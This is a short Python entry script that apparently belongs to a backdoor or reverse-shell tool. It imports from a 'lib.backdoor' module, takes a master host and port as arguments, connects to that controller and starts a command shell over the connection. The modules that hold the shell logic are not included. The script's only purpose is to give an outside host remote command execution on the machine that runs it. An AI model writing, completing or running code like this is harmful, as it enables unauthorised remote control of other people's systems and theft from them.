from lib.connection import *
from lib.args import *
from lib.backdoor import *


def main():
    master_hostname, master_port = get_args()
    conn = connect_master(master_hostname, master_port)
    cmd_shell(conn, master_hostname, master_port)
    return 0


if __name__ == "__main__":
    main()